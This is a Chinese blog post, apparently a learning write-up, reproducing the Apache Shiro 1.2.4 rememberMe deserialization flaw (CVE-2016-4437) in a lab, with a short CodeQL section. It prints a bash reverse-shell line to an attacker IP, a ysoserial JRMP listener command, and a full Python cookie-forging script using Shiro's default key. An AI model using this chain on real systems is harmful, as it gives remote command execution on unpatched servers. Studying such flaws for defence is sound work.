@@ -1,0 +1,701 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Aries.ico">
+  <link rel="icon" href="/img/Aries.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="YY">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="shiro1.2.4反序列化漏洞源码解析及codeql审计Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[代码审计] shiro1.2.4反序列化漏洞源码解析及codeql审计">
+<meta property="og:url" content="https://s1n9l3.github.io/2022/11/20/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]%20shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8F%8Acodeql%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="S1n9l3">
+<meta property="og:description" content="shiro1.2.4反序列化漏洞源码解析及codeql审计Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120211941945.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120213427975.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120162446837.png">
+<meta property="article:published_time" content="2022-11-20T08:09:25.187Z">
+<meta property="article:modified_time" content="2022-11-20T14:04:01.169Z">
+<meta property="article:author" content="YY">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="codeql">
+<meta property="article:tag" content="shiro">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120211941945.png">
+  
+  
+  
+  <title>[代码审计] shiro1.2.4反序列化漏洞源码解析及codeql审计 - S1n9l3</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"s1n9l3.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>WXYY</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/post.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="[代码审计] shiro1.2.4反序列化漏洞源码解析及codeql审计"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-20 16:09" pubdate>
+          2022年11月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">[代码审计] shiro1.2.4反序列化漏洞源码解析及codeql审计</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="shiro1-2-4反序列化漏洞源码解析及codeql审计"><a href="#shiro1-2-4反序列化漏洞源码解析及codeql审计" class="headerlink" title="shiro1.2.4反序列化漏洞源码解析及codeql审计"></a>shiro1.2.4反序列化漏洞源码解析及codeql审计</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
+<p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
+<blockquote>
+<p>这篇文章的目的是：</p>
+<ul>
+<li>学习shiro反序列化漏洞</li>
+<li>学习codeql分析过程</li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本来漏洞复现是准备在<code>vulhub</code>上做的，但是docker一直拉不了镜像，所以在<a target="_blank" rel="noopener" href="https://vulfocus.cn/">vulfocus</a>上做了，但是觉得这个上面的环境一直不是很稳，总是出现无法访问的问题。</p>
+<p>复现这个漏洞需要：</p>
+<ul>
+<li>用来反弹shell的VPS</li>
+<li>java工具<a target="_blank" rel="noopener" href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial</a></li>
+<li>python</li>
+</ul>
+<p>启动<code>shiro 反序列化（CVE-2016-4437）</code>的环境，有个登录的功能（没截图），输入账号密码登录，需要点击<code>RememberMe</code>，抓包，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120211941945.png" srcset="/img/loading.gif" lazyload alt="image-20221120211941945"></p>
+<p>反弹shell的的指令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/[攻击者IP]/[端口] 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<p>将其进行base64编码（假设为：XXXX），然后运行ysoserial工具：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp ysoserial-master-<span class="hljs-number">2874</span>a69f61-<span class="hljs-number">1</span>.jar ysoserial.exploit.JRMPListener <span class="hljs-number">6666</span> CommonsCollections4 <span class="hljs-string">&quot;bash -c &#123;echo,XXXX&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>运行后会显示<code>Opening JRMP listener on 6666</code>，</p>
+<p>接着需要伪造cookie内容，使用python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">command</span>):<br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])   <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure>
+
+<p>这样运行：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> shiro.<span class="hljs-keyword">py</span> 攻击和IP:监听端口<br></code></pre></td></tr></table></figure>
+
+<p>会得到这样的结果，</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rememberMe=<span class="hljs-number">6</span>pVbhZZ9RrCiwHtpZoCvgWiJFWv6pAWgY1iTpGc9Wf1rI1XiTiYGBgJa<span class="hljs-regexp">/vD1DRh7m1sy3PAICqd7mLXrYo4nP0hu/</span>M5V<span class="hljs-regexp">/RMXNoi7iU7YExP8r85f57W0tZHvlBauBxWGQ+QE9/</span>hvTIZ+Re<span class="hljs-regexp">/+kLDqj2vXKfmxZnte/</span>eVCdRC<span class="hljs-regexp">/69e0UXrkuyAsDy0rOE7bcitWxb0NQDreXe5e7hndz2Od+n1vFnH+Xq/</span>DIXzTy+bEZhm8QE0Lef<span class="hljs-regexp">/ZW2FL99Hp5USPnfnqKmrWSruGn1BLwSE1f6u88SUFDY+Entuamq2wU5yeITLFHUiUWYoZjjybdBXPWbbobnJPE0IxSAyqMXuLYk0OM3edozSan1E6LhowgD8/</span>dgGuEmRV0WizucNZXGGJTQS0QrWGIe3y+eKlD+qD1g==<br></code></pre></td></tr></table></figure>
+
+<p>然后修改数据包的<code>Cookie</code>内容为生成的字符串，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120213427975.png" srcset="/img/loading.gif" lazyload alt="image-20221120213427975"></p>
+<p>发送数据包，就可以得到反弹的shell了。</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h2 id="codeql审计"><a href="#codeql审计" class="headerlink" title="codeql审计"></a>codeql审计</h2><p>由于codeql需要用maven编译，根据网上的方法，使用命令：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">CodeQL <span class="hljs-keyword">database</span> <span class="hljs-keyword">create</span> shiro1<span class="hljs-number">.2</span><span class="hljs-number">.4</span> –<span class="hljs-keyword">language</span>=java –overwrite –command=&quot;mvn package -Dmaven.test.skip&quot;<br></code></pre></td></tr></table></figure>
+
+<p>但是没有成功，不断的出现错误，找了很多方法都没有成功。然后想到了vscode上的codeql插件好像可以直接下载数据库，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221120162446837.png" srcset="/img/loading.gif" lazyload alt="image-20221120162446837"></p>
+<p>先找到shiro在Github上的地址：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/tree/shiro-root-1.2.4%EF%BC%8C%E7%84%B6%E5%90%8E%E7%82%B9%E5%87%BB%E5%9B%BE%E7%A7%8D%E7%9A%84%E6%8C%89%E9%92%AE%EF%BC%8C%E8%BE%93%E5%85%A5%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8%E4%B8%8B%E8%BD%BD%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%86%EF%BC%8C%E7%9C%9F%E6%98%AF%E5%A4%AA%E6%96%B9%E4%BE%BF%E4%BA%86%EF%BC%81%EF%BC%81%EF%BC%81">https://github.com/apache/shiro/tree/shiro-root-1.2.4，然后点击图种的按钮，输入这个地址，就会自动下载数据库了，真是太方便了！！！</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html">java反序列化工具ysoserial分析 - angelwhu (wooyun.js.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%B7%A5%E5%85%B7/ysoserial-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B/">ysoserial 安装使用调试教程 – JohnFrod’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/panisme/p/12552838.html">Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）复现 - Panisme - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/shiro-rememberme-1-2-4/">【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞 (seebug.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/145246953">Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）源码解析 - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/255721#h3-10">CodeQL从0到1（内附Shiro检测demo）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/god_zzZ/article/details/124342364">CodeQL基础语法_god_Zeo的博客-CSDN博客</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>
+      
+        <a href="/tags/codeql/">#codeql</a>
+      
+        <a href="/tags/shiro/">#shiro</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>[代码审计] shiro1.2.4反序列化漏洞源码解析及codeql审计</div>
+      <div>https://s1n9l3.github.io/2022/11/20/[代码审计] shiro1.2.4反序列化漏洞源码解析及codeql审计/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>YY</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/20/%5Bctf-web%5D%20HCTF2018-WarmUp/" title="[ctf-web] HCTF2018-WarmUp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[ctf-web] HCTF2018-WarmUp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/19/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/" title="[ctf-web] 极客大挑战2019-EasySQL">
+                        <span class="hidden-mobile">[ctf-web] 极客大挑战2019-EasySQL</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
